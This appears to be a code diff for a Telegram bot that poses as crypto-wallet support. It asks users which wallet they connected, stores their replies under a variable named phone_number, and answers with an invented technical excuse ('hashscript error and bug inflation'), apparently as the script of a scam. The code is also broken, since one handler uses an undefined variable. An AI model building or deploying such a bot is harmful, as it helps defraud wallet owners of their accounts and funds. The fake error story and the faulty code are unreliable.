@@ -30,6 +30,8 @@ def ask_account(update, context: CallbackContext):
      update.message.reply_text("Which wallet account did you use to connect?")
      return TWO
 def first_question_step(message):
+    chat_id = update.message.chat_id
+    phone_number = update.message.text
     msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
     bot.register_next_step_handler(msg, second_step)
     return THREE
@@ -48,10 +50,10 @@ def second_step(message):
 CH = ConversationHandler (entry_points = [CommandHandler("start", start)],
      states = {ONE : [MessageHandler(Filters.text , ask_account)],
      TWO : [MessageHandler(Filters.text , first_question_step)],
-     THREE : [MessageHandler(Filters.text , second_step)]
+     THREE : [MessageHandler(Filters.text , second_step)],
      },
      fallbacks = [MessageHandler(Filters.regex('cancel'), cancel)],
-     )
+     allow_reentry= True)
 def error(update, context):
     """Log Errors caused by Updates."""
     logger.warning('Update "%s" caused error "%s"', update, context.error)
